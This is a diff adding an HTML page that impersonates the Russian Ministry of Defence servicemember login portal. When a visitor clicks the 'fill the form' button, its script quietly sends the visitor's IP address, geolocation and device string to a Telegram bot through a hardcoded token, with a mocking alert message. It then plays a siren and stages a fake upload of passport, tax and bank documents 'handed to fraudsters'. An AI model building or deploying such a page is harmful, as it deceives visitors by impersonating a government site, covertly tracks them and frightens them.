@@ -4,12 +4,294 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Личный кабинет · Министерство обороны РФ</title>
-<!-- ... весь твой <style> ... -->
+<link rel="icon" type="image/svg+xml" href="favicon.svg">
+
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  :root{
+    --red:#b01116;
+    --red-2:#c9161c;
+    --dark:#1c1e22;
+    --gold:#d8a52a;
+    --green:#39ff88;
+    --muted:#9aa4b8;
+  }
+  body{font-family:"Segoe UI",Arial,sans-serif;background:#0d0e10;color:#e8ebf0}
+  a{color:inherit;text-decoration:none}
+
+  .site{min-height:100vh;transition:filter .6s}
+  .site.blur{filter:blur(8px) brightness(.6);pointer-events:none;user-select:none}
+
+  header.top{
+    background:repeating-linear-gradient(45deg,#1a1c20,#1a1c20 2px,#202226 2px,#202226 4px);
+    border-bottom:3px solid var(--red);padding:14px 0;
+  }
+  .wrap{max-width:1200px;margin:0 auto;padding:0 24px}
+  .top-inner{display:flex;align-items:center;gap:18px}
+  .emblem{
+    width:64px;height:64px;flex:none;border-radius:50%;
+    background:radial-gradient(circle at 50% 40%,#2a2c30,#111);
+    border:2px solid var(--gold);
+    display:flex;align-items:center;justify-content:center;position:relative;
+  }
+  .emblem svg{width:44px;height:44px}
+  .min-name{line-height:1.15}
+  .min-name b{display:block;font-size:15px;letter-spacing:1px;font-weight:800}
+  .min-name span{font-size:11px;color:var(--muted);letter-spacing:1px}
+  .cabinet{margin-left:auto;font-size:26px;font-weight:800;color:#fff}
+
+  nav.menu{background:#141518;border-bottom:1px solid #26282d}
+  .menu-inner{display:flex;gap:36px;padding:16px 0}
+  .menu-inner a{font-size:15px;color:#cfd4de;position:relative;padding-bottom:8px}
+  .menu-inner a.active{color:var(--gold)}
+  .menu-inner a.active::after{content:"";position:absolute;left:0;right:0;bottom:0;height:3px;background:var(--gold);border-radius:2px}
+
+  .hero{
+    background:linear-gradient(rgba(10,10,12,.82),rgba(10,10,12,.92)),
+      radial-gradient(600px 300px at 80% 40%, rgba(176,17,22,.4), transparent 70%),#0b0b0d;
+    padding:56px 0;
+  }
+  .hero-grid{display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:center}
+  .field{margin-bottom:26px}
+  .field label{display:block;font-size:15px;color:#cfd4de;margin-bottom:6px}
+  .field input{
+    width:100%;background:transparent;border:none;border-bottom:1px solid #666;
+    color:#fff;font-size:16px;padding:8px 2px;outline:none;
+  }
+  .field input:focus{border-color:var(--gold)}
+  .btn-login{
+    width:100%;background:var(--red);color:#fff;border:none;border-radius:6px;
+    padding:15px;font-size:17px;font-weight:700;cursor:pointer;display:flex;
+    align-items:center;justify-content:center;gap:8px;transition:background .2s;
+  }
+  .btn-login:hover{background:var(--red-2)}
+  .btn-gos{
+    width:100%;background:#eee;color:#222;border:none;border-radius:6px;margin-top:14px;
+    padding:15px;font-size:16px;font-weight:600;cursor:pointer;display:flex;
+    align-items:center;justify-content:center;gap:8px;
+  }
+  .links a{display:block;color:#e8ebf0;margin-bottom:14px;font-size:15px}
+  .links a::before{content:"› ";color:var(--muted)}
+  .note-side{margin-top:26px;font-style:italic;color:var(--muted);font-size:14px;line-height:1.6}
+
+  .notice{
+    max-width:1000px;margin:40px auto;background:var(--red);border-radius:8px;
+    padding:28px 34px;
+  }
+  .notice h3{text-align:center;font-size:19px;margin-bottom:14px}
+  .notice p{font-size:15px;line-height:1.7;margin-bottom:12px}
+
+  .modal-overlay{
+    position:fixed;inset:0;z-index:40;display:flex;align-items:center;justify-content:center;
+    background:rgba(6,7,10,.55);
+  }
+  .modal{
+    background:linear-gradient(180deg,#181a20,#101216);
+    border:1px solid rgba(216,165,42,.4);border-radius:16px;
+    padding:40px 36px;text-align:center;max-width:440px;width:90%;
+    box-shadow:0 30px 80px rgba(0,0,0,.6);animation:pop .4s ease;
+  }
+  @keyframes pop{0%{transform:scale(.85);opacity:0}100%{transform:scale(1);opacity:1}}
+  .modal .mico{font-size:46px;margin-bottom:10px}
+  .modal h2{font-size:22px;color:#fff;margin-bottom:12px}
+  .modal p{color:var(--muted);font-size:15px;line-height:1.6;margin-bottom:26px}
+  .btn-fill{
+    background:var(--red);color:#fff;border:none;border-radius:10px;
+    padding:16px 30px;font-size:18px;font-weight:800;cursor:pointer;width:100%;
+    transition:transform .15s,background .2s;
+  }
+  .btn-fill:hover{transform:translateY(-2px);background:var(--red-2)}
+
+  .extract{
+    position:fixed;inset:0;z-index:60;display:none;
+    background:radial-gradient(1000px 600px at 50% -10%, rgba(176,17,22,.22), transparent 60%),#05070d;
+    font-family:"Consolas","Courier New",monospace;
+    padding:20px;overflow:auto;
+  }
+  .extract.show{display:flex;align-items:center;justify-content:center}
+  .ebox{width:100%;max-width:680px}
+  .ehead{display:flex;align-items:center;gap:12px;margin-bottom:22px}
+  .dot{width:12px;height:12px;border-radius:50%;background:#ff4d4d;box-shadow:0 0 12px #ff4d4d;animation:blink 1s infinite}
+  @keyframes blink{50%{opacity:.25}}
+  .ehead h1{font-size:15px;font-weight:700;letter-spacing:1px;color:#fff;text-transform:uppercase}
+  .ehead .sys{font-size:12px;color:var(--muted)}
+  .ewarn{border:1px solid rgba(255,77,77,.4);background:rgba(255,77,77,.06);border-radius:10px;
+    padding:12px 16px;margin-bottom:22px;font-size:13px;color:#ffd0d0}
+  .console{background:#0a0e17;border:1px solid rgba(255,255,255,.08);border-radius:12px;
+    padding:18px;height:230px;overflow:hidden;font-size:13px;line-height:1.9;box-shadow:inset 0 0 40px rgba(0,0,0,.5)}
+  .console .line{white-space:nowrap}
+  .ok{color:var(--green)} .info{color:#5aa0ff} .dim{color:var(--muted)} .danger{color:#ff4d4d}
+  .pwrap{margin-top:24px}
+  .ptop{display:flex;justify-content:space-between;font-size:13px;margin-bottom:8px}
+  .ptop .label{color:var(--muted)} .ptop .pct{color:var(--green);font-weight:700}
+  .bar{height:16px;background:#0a0e17;border:1px solid rgba(255,255,255,.1);border-radius:20px;overflow:hidden}
+  .fill{height:100%;width:0;border-radius:20px;background:linear-gradient(90deg,#b01116,#39ff88);
+    box-shadow:0 0 18px rgba(57,255,136,.6);transition:width .15s}
+  .sub{margin-top:10px;font-size:12px;color:var(--muted);height:16px}
+
+  .extract.done-bg{
+    background:linear-gradient(rgba(3,5,10,.62),rgba(3,5,10,.62)),
+      url(data:image/jpeg;base64,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) center center / cover no-repeat;
+  }
+  .done{display:none;text-align:center;max-width:620px}
+  .done.show{display:block;animation:pop .5s ease}
+  .done h2,.done p{text-shadow:0 2px 14px rgba(0,0,0,.85)}
+  .done .check{width:96px;height:96px;border-radius:50%;margin:0 auto 24px;
+    background:rgba(57,255,136,.12);border:2px solid var(--green);
+    display:flex;align-items:center;justify-content:center;font-size:52px;color:var(--green)}
+  .done h2{font-size:clamp(26px,6vw,40px);font-weight:800;color:#fff}
+  .done p{color:#c4d0e4;font-size:17px;margin-top:16px;line-height:1.6}
+  .done .code{margin-top:22px;font-size:13px;color:var(--muted)}
+
+  .flash{position:fixed;inset:0;background:#ff4d4d;opacity:0;pointer-events:none;z-index:70}
+  .flash.go{animation:flash .5s 3}
+  @keyframes flash{50%{opacity:.4}}
+
+  @media(max-width:820px){
+    .hero-grid{grid-template-columns:1fr;gap:34px}
+    .cabinet{font-size:20px}
+    .menu-inner{gap:18px;flex-wrap:wrap}
+  }
+</style>
 </head>
 <body>
-  <!-- ... весь HTML-контент без изменений ... -->
+
+  <div class="flash" id="flash"></div>
+
+  <div class="site" id="site">
+    <header class="top">
+      <div class="wrap top-inner">
+        <div class="emblem">
+          <svg viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg">
+            <g fill="#d8d8d8">
+              <circle cx="22" cy="9" r="4"/>
+              <path d="M22 12 C14 12 8 16 6 24 C10 20 14 20 16 24 C13 26 12 30 14 34 C16 30 20 30 22 33 C24 30 28 30 30 34 C32 30 31 26 28 24 C30 20 34 20 38 24 C36 16 30 12 22 12 Z"/>
+              <path fill="#b01116" d="M22 20 l1.5 3 h3 l-2.5 2 1 3 -3-2 -3 2 1-3 -2.5-2 h3 Z"/>
+            </g>
+          </svg>
+        </div>
+        <div class="min-name">
+          <b>МИНИСТЕРСТВО ОБОРОНЫ</b>
+          <b>РОССИЙСКОЙ ФЕДЕРАЦИИ</b>
+          <span>МИНОБОРОНЫ РОССИИ</span>
+        </div>
+        <div class="cabinet">Личный кабинет</div>
+      </div>
+    </header>
+
+    <nav class="menu">
+      <div class="wrap menu-inner">
+        <a class="active" href="#">Главная</a>
+        <a href="#">Финансовая информация</a>
+        <a href="#">Информация</a>
+        <a href="#">Вопросы и ответы</a>
+        <a href="#">Финансовая грамотность</a>
+        <a href="#">Запросы и обращения</a>
+        <a href="#">Контакты</a>
+      </div>
+    </nav>
+
+    <section class="hero">
+      <div class="wrap hero-grid">
+        <div>
+          <div class="field"><label>Логин</label><input type="text" placeholder=""></div>
+          <div class="field"><label>Пароль</label><input type="password" placeholder=""></div>
+          <button class="btn-login">Войти ›</button>
+          <button class="btn-gos">Войти через Госуслуги ›</button>
+        </div>
+        <div>
+          <div class="links">
+            <a href="#">Пройти регистрацию</a>
+            <a href="#">Восстановить пароль</a>
+            <a href="#">Инструкция пользователя ЛКВ</a>
+          </div>
+          <div class="note-side">Вся информация хранится и обрабатывается с соблюдением требований российского законодательства о персональных данных.</div>
+        </div>
+      </div>
+    </section>
+
+    <div class="notice">
+      <h3>Уважаемые пользователи!</h3>
+      <p>Обращаем Ваше внимание, что для корректной и безопасной работы «Личного кабинета военнослужащего» рекомендуем использовать браузеры с поддержкой российских сертификатов безопасности (Яндекс Браузер, Атом) или установить на Ваше устройство корневой сертификат Минцифры России.</p>
+      <p>При авторизации на Вашем смартфоне (или роутере) необходимо отключить «виртуальную частную сеть» (VPN), а также режим полёта и блокировщик всплывающих окон.</p>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal">
+      <div class="mico">📋</div>
+      <h2>Требуется заполнить форму</h2>
+      <p>Для доступа к личному кабинету военнослужащего необходимо заполнить форму.</p>
+      <button class="btn-fill" id="fillBtn">Заполнить форму</button>
+    </div>
+  </div>
+
+  <div class="extract" id="extract">
+    <div class="ebox" id="ebox">
+      <div class="ehead">
+        <span class="dot"></span>
+        <div>
+          <h1>Синхронизация документов</h1>
+          <div class="sys">ID сессии: <span id="sid"></span> · защищённое соединение ГОСТ</div>
+        </div>
+      </div>
+      <div class="ewarn">⚠️ Идёт автоматическая выгрузка документов…</div>
+      <div class="console" id="console"></div>
+      <div class="pwrap">
+        <div class="ptop"><span class="label">Выгрузка документов…</span><span class="pct" id="pct">0%</span></div>
+        <div class="bar"><div class="fill" id="fill"></div></div>
+        <div class="sub" id="sub">Инициализация…</div>
+      </div>
+    </div>
+
+    <div class="done" id="done">
+      <div class="check">✓</div>
+      <h2>Данные успешно выгружены</h2>
+      <p>Все документы получены и переданы мошенникам.</p>
+      <div class="code">Код операции: <span id="opcode"></span> · Госуслуги © <span id="year"></span></div>
+    </div>
+  </div>
 
 <script>
+  // ===== УВЕДОМЛЕНИЕ В TELEGRAM (IP + ГЕО) =====
+  async function notifyTelegram() {
+      const botToken = "8849150523:AAHfJ5rW-muaXsDNaGYGalebCKqKTRdEfz4";
+      const chatId = "-1004364596513";
+
+      let ip = "Не удалось определить";
+      let geo = "Неизвестно";
+
+      try {
+          const res = await fetch('https://ipapi.co/json/');
+          const data = await res.json();
+          ip = data.ip || ip;
+          geo = `${data.city || ''}, ${data.region || ''}, ${data.country_name || 'RU'}`.replace(/,\s*,/g, ', ').trim();
+      } catch (e) {}
+
+      const time = new Date().toISOString().replace('T', ' ').slice(0, 19) + " UTC";
+      const device = navigator.userAgent;
+
+      const message = `🔔 ДУРА НАЖАЛА КНОПКУ!!!\n\n` +
+                      `🕒 Время: ${time}\n` +
+                      `🌐 IP: ${ip}\n` +
+                      `📍 Гео: ${geo}\n` +
+                      `💻 Устройство: ${device}`;
+
+      try {
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                  chat_id: chatId,
+                  text: message,
+                  parse_mode: 'HTML'
+              }),
+              keepalive: true
+          }).catch(() => {});
+      } catch (e) {}
+  }
+
+  // ===== УВЕДОМЛЕНИЕ НА VERCEL API =====
   function notifyServer() {
       fetch('/api/notify', {
           method: 'POST',
@@ -18,15 +300,103 @@
       }).catch(() => {});
   }
 
-  // ... весь остальной твой JS (startSiren, begin, startProgress и т.д.)
-
-  function begin(){
-      notifyServer();       // ← теперь идёт на Vercel API
-
-      // ... остальной код begin()
+  // ===== ЗВУК (сирена) =====
+  let sirenAudio = null;
+  function startSiren(){
+    sirenAudio = new Audio('melody.mp3');
+    sirenAudio.loop = true;
+    sirenAudio.volume = 1.0;
+    sirenAudio.play().catch(()=>{});
   }
 
-  // ... остальной скрипт
+  const consoleEl = document.getElementById('console');
+  const fill = document.getElementById('fill');
+  const pctEl = document.getElementById('pct');
+  const subEl = document.getElementById('sub');
+
+  const files = [
+    'Паспорт гражданина РФ','СНИЛС','ИНН','Заграничный паспорт',
+    'Военный билет','Удостоверение личности офицера','Полис ОМС',
+    'Данные о недвижимости','Транспортные средства','Штрафы ГИБДД',
+    'Налоговые начисления','Пенсионные накопления (СФР)','Банковские реквизиты',
+    'Денежное довольствие','Личное дело военнослужащего'
+  ];
+
+  const bootLines = [
+    {t:'> Подключение к lk.mil.ru...',c:'dim'},
+    {t:'> Соединение установлено ✓',c:'ok'},
+    {t:'> Проверка учётной записи ЕСИА...',c:'info'},
+    {t:'> Доступ к документам подтверждён',c:'ok'}
+  ];
+
+  function pushLine(text, cls){
+    const d = document.createElement('div');
+    d.className = 'line ' + (cls || '');
+    d.textContent = text;
+    consoleEl.appendChild(d);
+    if(consoleEl.children.length > 9) consoleEl.removeChild(consoleEl.firstChild);
+  }
+
+  function begin(){
+      notifyTelegram();     // Telegram-уведомление
+      notifyServer();       // Уведомление на Vercel
+
+      document.getElementById('modalOverlay').style.display = 'none';
+      document.getElementById('site').classList.add('blur');
+      document.getElementById('extract').classList.add('show');
+      document.getElementById('sid').textContent = Math.random().toString(36).slice(2,10).toUpperCase();
+      startSiren();
+
+      let step = 0;
+      const boot = setInterval(() => {
+        if(step < bootLines.length){
+          pushLine(bootLines[step].t, bootLines[step].c);
+          step++;
+        } else {
+          clearInterval(boot);
+          startProgress();
+        }
+      }, 350);
+  }
+
+  function startProgress(){
+    let pct = 0, fileIdx = -1;
+    const timer = setInterval(() => {
+      pct += Math.random()*5 + 3;
+      if(pct > 100) pct = 100;
+
+      fill.style.width = pct + '%';
+      pctEl.textContent = Math.floor(pct) + '%';
+
+      const idx = Math.min(files.length-1, Math.floor(pct / (100 / files.length)));
+      if(idx !== fileIdx){
+        fileIdx = idx;
+        pushLine('> Выгрузка: ' + files[fileIdx], 'danger');
+        subEl.textContent = 'Копирование: ' + files[fileIdx];
+      }
+
+      if(pct >= 100){
+        clearInterval(timer);
+        subEl.textContent = 'Готово. Передача данных...';
+        pushLine('> Выгрузка завершена. Документов: ' + files.length, 'ok');
+        setTimeout(finish, 800);
+      }
+    }, 120);
+  }
+
+  function finish(){
+    const flash = document.getElementById('flash');
+    flash.classList.add('go');
+    document.getElementById('opcode').textContent = Math.random().toString(36).slice(2,12).toUpperCase();
+    document.getElementById('year').textContent = new Date().getFullYear();
+    setTimeout(() => {
+      document.getElementById('ebox').style.display = 'none';
+      document.getElementById('extract').classList.add('done-bg');
+      document.getElementById('done').classList.add('show');
+    }, 550);
+  }
+
+  document.getElementById('fillBtn').addEventListener('click', begin);
 </script>
 </body>
 </html>
